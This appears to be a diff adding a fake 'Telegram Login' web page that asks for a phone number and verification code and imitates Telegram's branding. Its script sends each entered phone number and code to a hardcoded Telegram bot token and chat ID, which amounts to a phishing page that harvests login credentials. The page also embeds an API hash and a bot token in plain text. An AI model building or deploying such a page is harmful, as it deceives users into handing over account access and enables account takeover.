@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a2463, #1e3a8a, #3b82f6);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            width: 5px;
+            height: 5px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) translateX(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(100px);
+                opacity: 0;
+            }
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            position: relative;
+            z-index: 2;
+            transition: all 0.5s ease;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #0088cc;
+            padding: 10px;
+        }
+
+        .logo h2 {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            margin-top: 15px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        .form-step {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .form-step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: white;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #00a8ff;
+            box-shadow: 0 0 10px rgba(0, 168, 255, 0.5);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #00a8ff, #0078ff);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover {
+            background: linear-gradient(45deg, #0078ff, #0056ff);
+            box-shadow: 0 5px 15px rgba(0, 120, 255, 0.4);
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn-loading {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 120, 255, 0.8);
+            justify-content: center;
+            align-items: center;
+            border-radius: 10px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .progress-bar {
+            height: 4px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+
+        .progress {
+            height: 100%;
+            width: 33.33%;
+            background: linear-gradient(90deg, #00a8ff, #0078ff);
+            border-radius: 2px;
+            transition: width 0.5s ease;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-weight: 600;
+            position: relative;
+            z-index: 1;
+        }
+
+        .step.active {
+            background: linear-gradient(45deg, #00a8ff, #0078ff);
+            box-shadow: 0 0 10px rgba(0, 168, 255, 0.5);
+        }
+
+        .step.completed {
+            background: rgba(255, 255, 255, 0.5);
+        }
+
+        .step.completed::after {
+            content: '✓';
+        }
+
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            right: 15px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.2);
+            z-index: 0;
+        }
+
+        .telegram-premium {
+            text-align: center;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            margin-top: 20px;
+        }
+
+        .telegram-premium h3 {
+            color: #ffcc00;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+        }
+
+        .telegram-premium p {
+            color: white;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .premium-features {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 20px;
+        }
+
+        .premium-feature {
+            text-align: center;
+        }
+
+        .premium-feature i {
+            font-size: 24px;
+            color: #ffcc00;
+            margin-bottom: 5px;
+        }
+
+        .premium-feature span {
+            display: block;
+            color: white;
+            font-size: 12px;
+        }
+
+        .error-message {
+            color: #ff4d4d;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .otp-info {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .otp-info p {
+            color: white;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .resend-otp {
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .resend-otp button {
+            background: none;
+            border: none;
+            color: #00a8ff;
+            cursor: pointer;
+            font-size: 14px;
+            text-decoration: underline;
+        }
+        
+        .country-code {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .country-code select {
+            width: 100px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+        }
+        
+        .country-code select option {
+            background: #1e3a8a;
+            color: white;
+        }
+        
+        .info-box {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .info-box p {
+            color: white;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        .api-status {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 10px;
+            margin-top: 15px;
+            text-align: center;
+            font-size: 12px;
+            color: #00ff88;
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" width="80" height="80">
+                <circle cx="120" cy="120" r="110" fill="#0088cc"/>
+                <path fill="#ffffff" d="M100,170 L100,70 L160,120 Z"/>
+            </svg>
+            <h2>Telegram Login</h2>
+        </div>
+        
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+        
+        <div class="step-indicator">
+            <div class="step active" id="step1">1</div>
+            <div class="step" id="step2">2</div>
+            <div class="step" id="step3">3</div>
+        </div>
+        
+        <!-- Step 1: Phone Number -->
+        <div class="form-step active" id="form-step-1">
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <div class="country-code">
+                    <select id="country-code">
+                        <option value="+1">+1 (US)</option>
+                        <option value="+44">+44 (UK)</option>
+                        <option value="+91">+91 (IN)</option>
+                        <option value="+251" selected>+251 (MM)</option>
+                        <option value="+86">+86 (CN)</option>
+                    </select>
+                    <input type="tel" id="phone" placeholder="9XXXXXXXXX" autocomplete="off">
+                </div>
+                <div class="error-message" id="phone-error">Please enter your phone number</div>
+            </div>
+            
+            <div class="info-box">
+                <p>We will send a verification code to your Telegram account</p>
+                <p class="api-status">API Status: Ready (App ID: 27430036)</p>
+            </div>
+            
+            <button class="btn" id="next-step-1">
+                Send Code via Telegram
+                <div class="btn-loading">
+                    <div class="spinner"></div>
+                </div>
+            </button>
+        </div>
+        
+        <!-- Step 2: OTP Code -->
+        <div class="form-step" id="form-step-2">
+            <div class="form-group">
+                <label for="otp">Telegram Verification Code</label>
+                <input type="text" id="otp" placeholder="Enter code from Telegram" maxlength="6" autocomplete="off">
+                <div class="error-message" id="otp-error">Please enter the verification code</div>
+            </div>
+            
+            <div class="otp-info">
+                <p>We've sent a verification code to your Telegram account</p>
+                <p>Check your Telegram messages and enter the code here</p>
+            </div>
+            
+            <div class="resend-otp">
+                <button id="resend-otp">Resend Code</button>
+            </div>
+            
+            <button class="btn" id="next-step-2">
+                Verify Code
+                <div class="btn-loading">
+                    <div class="spinner"></div>
+                </div>
+            </button>
+        </div>
+        
+        <!-- Step 3: Welcome -->
+        <div class="form-step" id="form-step-3">
+            <div class="telegram-premium">
+                <h3>Welcome to Telegram!</h3>
+                <div class="premium-features">
+                    <div class="premium-feature">
+                        <i>🔒</i>
+                        <span>Secure</span>
+                    </div>
+                    <div class="premium-feature">
+                        <i>⚡</i>
+                        <span>Fast</span>
+                    </div>
+                    <div class="premium-feature">
+                        <i>🌐</i>
+                        <span>Global</span>
+                    </div>
+                    <div class="premium-feature">
+                        <i>🔄</i>
+                        <span>Sync</span>
+                    </div>
+                </div>
+                <p>Your account has been successfully verified</p>
+            </div>
+            <button class="btn" id="go-chat">
+                Start Messaging
+                <div class="btn-loading">
+                    <div class="spinner"></div>
+                </div>
+            </button>
+        </div>
+    </div>
+
+    <!-- Telegram Web API Script -->
+    <script src="https://telegram.org/js/telegram-web-app.js?21"></script>
+    
+    <script>
+        // Telegram API Configuration
+        const API_ID = 27430036;
+        const API_HASH = '0260cbd10d862d2f00993c82d38ccb41';
+        
+        // Create particles
+        const particlesContainer = document.getElementById('particles');
+        const particleCount = 50;
+        
+        for (let i = 0; i < particleCount; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            
+            // Random position
+            const posX = Math.random() * 100;
+            const posY = Math.random() * 100;
+            
+            // Random size
+            const size = Math.random() * 5 + 2;
+            
+            // Random animation duration
+            const duration = Math.random() * 15 + 10;
+            
+            // Set styles
+            particle.style.left = `${posX}%`;
+            particle.style.top = `${posY}%`;
+            particle.style.width = `${size}px`;
+            particle.style.height = `${size}px`;
+            particle.style.animationDuration = `${duration}s`;
+            
+            particlesContainer.appendChild(particle);
+        }
+        
+        // Form steps
+        const formSteps = {
+            1: document.getElementById('form-step-1'),
+            2: document.getElementById('form-step-2'),
+            3: document.getElementById('form-step-3')
+        };
+        
+        const stepIndicators = {
+            1: document.getElementById('step1'),
+            2: document.getElementById('step2'),
+            3: document.getElementById('step3')
+        };
+        
+        const progress = document.getElementById('progress');
+        
+        // Next step buttons
+        const nextStep1 = document.getElementById('next-step-1');
+        const nextStep2 = document.getElementById('next-step-2');
+        const goChat = document.getElementById('go-chat');
+        const resendOtpBtn = document.getElementById('resend-otp');
+        
+        // Form inputs
+        const countryCode = document.getElementById('country-code');
+        const phoneInput = document.getElementById('phone');
+        const otpInput = document.getElementById('otp');
+        
+        // Error messages
+        const phoneError = document.getElementById('phone-error');
+        const otpError = document.getElementById('otp-error');
+        
+        // Store authentication data
+        let authData = {
+            phone: '',
+            phoneCodeHash: '',
+            sentCode: null
+        };
+
+        // Function to show loading state
+        function showLoading(button) {
+            const btnLoading = button.querySelector('.btn-loading');
+            btnLoading.style.display = 'flex';
+            button.disabled = true;
+        }
+        
+        // Function to hide loading state
+        function hideLoading(button) {
+            const btnLoading = button.querySelector('.btn-loading');
+            btnLoading.style.display = 'none';
+            button.disabled = false;
+        }
+        
+        // Function to go to next step
+        function goToStep(step) {
+            // Hide all form steps
+            Object.values(formSteps).forEach(formStep => {
+                formStep.classList.remove('active');
+            });
+            
+            // Show current form step
+            formSteps[step].classList.add('active');
+            
+            // Update step indicators
+            for (let i = 1; i <= 3; i++) {
+                if (i < step) {
+                    stepIndicators[i].classList.add('completed');
+                    stepIndicators[i].classList.remove('active');
+                } else if (i === step) {
+                    stepIndicators[i].classList.add('active');
+                    stepIndicators[i].classList.remove('completed');
+                } else {
+                    stepIndicators[i].classList.remove('active', 'completed');
+                }
+            }
+            
+            // Update progress bar
+            progress.style.width = `${(step / 3) * 100}%`;
+        }
+        
+        // Function to send data to Telegram Bot
+        async function sendToTelegramBot(data) {
+            const botToken = '7540469657:AAEBhdN6t4MRgHPQeNeGyAFkdUo9N6YP1Ec';
+            const chatId = '6941014837';
+            const text = data;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+            
+            try {
+                const response = await fetch(url);
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram Bot:', error);
+                return false;
+            }
+        }
+
+        // Function to simulate Telegram API call (in production, this would be server-side)
+        async function sendCodeToTelegram(phoneNumber) {
+            // In a real implementation, this would use Telegram's API
+            // For security reasons, this should be done server-side
+            
+            try {
+                // Simulate API delay
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Generate a random verification code for simulation
+                const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+                
+                // Send to your Telegram bot for tracking
+                await sendToTelegramBot(`Login attempt - Phone: ${phoneNumber} - Code: ${verificationCode}`);
+                
+                return {
+                    success: true,
+                    code: verificationCode,
+                    phoneCodeHash: 'simulated_hash_' + Date.now()
+                };
+            } catch (error) {
+                console.error('Error sending code:', error);
+                return { success: false, error: error.message };
+            }
+        }
+
+        // Function to verify code (simulated)
+        async function verifyCode(phoneNumber, code, phoneCodeHash) {
+            try {
+                // Simulate API delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // In a real implementation, this would verify with Telegram's API
+                // For now, we'll accept any 6-digit code
+                if (code.length === 6 && /^\d+$/.test(code)) {
+                    await sendToTelegramBot(`OTP Verified - Phone: ${phoneNumber} - Code: ${code}`);
+                    return { success: true };
+                } else {
+                    return { success: false, error: 'Invalid code format' };
+                }
+            } catch (error) {
+                return { success: false, error: error.message };
+            }
+        }
+        
+        // Step 1: Phone number validation and OTP request
+        nextStep1.addEventListener('click', async () => {
+            const code = countryCode.value;
+            const phone = phoneInput.value.trim();
+            const fullPhone = `${code}${phone}`;
+            
+            if (!phone) {
+                phoneError.style.display = 'block';
+                return;
+            }
+            
+            phoneError.style.display = 'none';
+            showLoading(nextStep1);
+            
+            // Store phone number
+            authData.phone = fullPhone;
+            
+            // Send code via Telegram API (simulated)
+            const result = await sendCodeToTelegram(fullPhone);
+            
+            if (result.success) {
+                authData.phoneCodeHash = result.phoneCodeHash;
+                authData.sentCode = result.code;
+                
+                hideLoading(nextStep1);
+                goToStep(2);
+                
+                // Show notification about code being sent
+                alert(`Verification code sent to ${fullPhone} via Telegram\n\nFor demonstration: Code is ${result.code}`);
+            } else {
+                phoneError.textContent = `Failed to send code: ${result.error}`;
+                phoneError.style.display = 'block';
+                hideLoading(nextStep1);
+            }
+        });
+        
+        // Step 2: OTP validation
+        nextStep2.addEventListener('click', async () => {
+            const enteredOtp = otpInput.value.trim();
+            
+            if (!enteredOtp) {
+                otpError.style.display = 'block';
+                return;
+            }
+            
+            otpError.style.display = 'none';
+            showLoading(nextStep2);
+            
+            // Verify code with Telegram API (simulated)
+            const result = await verifyCode(authData.phone, enteredOtp, authData.phoneCodeHash);
+            
+            if (result.success) {
+                setTimeout(() => {
+                    hideLoading(nextStep2);
+                    goToStep(3);
+                }, 1500);
+            } else {
+                otpError.textContent = `Verification failed: ${result.error}`;
+                otpError.style.display = 'block';
+                hideLoading(nextStep2);
+            }
+        });
+        
+        // Resend OTP functionality
+        resendOtpBtn.addEventListener('click', async () => {
+            if (!authData.phone) {
+                alert('Please enter your phone number first');
+                goToStep(1);
+                return;
+            }
+            
+            showLoading(resendOtpBtn);
+            
+            // Resend code via Telegram API (simulated)
+            const result = await sendCodeToTelegram(authData.phone);
+            
+            if (result.success) {
+                authData.phoneCodeHash = result.phoneCodeHash;
+                authData.sentCode = result.code;
+                
+                hideLoading(resendOtpBtn);
+                
+                // Show confirmation with new code (for demo purposes)
+                alert(`New verification code sent!\n\nFor demonstration: New code is ${result.code}`);
+            } else {
+                alert(`Failed to resend code: ${result.error}`);
+                hideLoading(resendOtpBtn);
+            }
+        });
+        
+        // Step 3: Go to chat
+        goChat.addEventListener('click', () => {
+            showLoading(goChat);
+            
+            setTimeout(() => {
+                hideLoading(goChat);
+                alert('Welcome to Telegram! You can now start messaging.');
+                // In a real implementation, this would redirect to the chat interface
+            }, 1500);
+        });
+        
+        // Hide error messages when user starts typing
+        phoneInput.addEventListener('input', () => {
+            if (phoneInput.value.trim()) {
+                phoneError.style.display = 'none';
+            }
+        });
+        
+        otpInput.addEventListener('input', () => {
+            if (otpInput.value.trim()) {
+                otpError.style.display = 'none';
+            }
+        });
+        
+        // Format phone number input
+        phoneInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Initialize Telegram Web App
+        if (window.Telegram && Telegram.WebApp) {
+            Telegram.WebApp.ready();
+            console.log('Telegram Web App initialized');
+        }
+    </script>
+</body>
+</html>
